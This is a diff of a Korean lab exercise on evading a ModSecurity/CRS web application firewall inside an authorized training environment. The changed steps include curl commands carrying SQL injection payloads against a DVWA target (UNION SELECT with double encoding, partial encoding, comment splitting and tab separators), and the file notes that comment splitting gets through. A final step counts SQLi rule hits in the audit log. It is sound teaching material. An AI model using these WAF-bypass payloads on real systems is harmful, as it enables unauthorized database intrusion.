@@ -14,7 +14,8 @@ description: |
   302 우회된다 — "정규화는 강력하나 만능이 아님". 마지막에 우회 결과 차이(인코딩·탭·대소문자=차단,
   주석분할=우회)와 고급 방향(WAF–백엔드 파서 차이·HPP)을 정리한다.
   실습은 페이로드 전송 + 로그 읽기뿐이라 심는 흔적이 없다(공유 인프라 보존). 인가된 실습 환경
-  (el34)에서만. 모든 명령은 el34 호스트(ssh ccc@192.168.0.151)에서 docker exec 로. 합격 임계값 0.7.
+  (el34)에서만. 모든 명령은 el34 호스트(ssh ccc@192.168.0.151)에서 실행하며, 컨테이너 작업은
+  docker exec -it <컨테이너> bash 로 접속해 수행한다. 합격 임계값 0.7.
 difficulty: medium
 duration_minutes: 160
 prerequisites:
@@ -39,9 +40,12 @@ steps:
       dvwa 는 ModSec 차단 모드(403), juice 는 탐지만(200)이므로 대상은 dvwa 다(lecture §1.3).
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/
       ```
       - `-H 'Host: dvwa.el34.lab'`(dvwa vhost 지정), `-w 'dvwa=%{http_code}'`(응답 코드만), `-o /dev/null`(본문 버림).
 
@@ -78,9 +82,12 @@ steps:
       "변형이 이 403 을 200 으로 바꿀 수 있는가"라는 우회의 질문이 성립한다(lecture §1.1).
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
       # 2) 해석 — 평문 SQLi=403(baseline), 우회로 이걸 통과시킬 수 있나?
       echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
       ```
@@ -122,11 +129,14 @@ steps:
       (`t:urlDecodeUni`)로 **먼저 디코드한 뒤** 검사하므로 이 가정이 깨진다(lecture §2, §4).
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
+      curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'
       # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
+      curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'
       # 3) 해석 — CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
       echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
       ```
@@ -172,12 +182,15 @@ steps:
       (libinjection)는 주석 분할(`UN/**/ION`)을 복원하지 못해 **실제로 우회(302)** 된다(lecture §3, §4).
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
       ```bash
       # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'")
+      C=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT')
       echo "cmt=$C"
       # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'")
+      T=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT')
       echo "tab=$T"
       # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
@@ -288,9 +301,12 @@ steps:
       한 룰군에 모인다. CRS 가 다양한 우회를 하나의 탐지로 흡수하는 강점이다.
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
       ```bash
       # 1) modsec_audit 최근 150줄에서 942(SQLi) 룰ID 집계 — 우회 시도들이 정규화 후 942에 잡힘
-      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c
       # 2) 해석 — 인코딩/주석/공백 우회 모두 정규화 후 942(SQLi)에 탐지(CRS 강점)
       echo "→ 인코딩/주석/공백 우회 모두 정규화 후 942(SQLi)에 탐지. CRS의 강점"
       ```
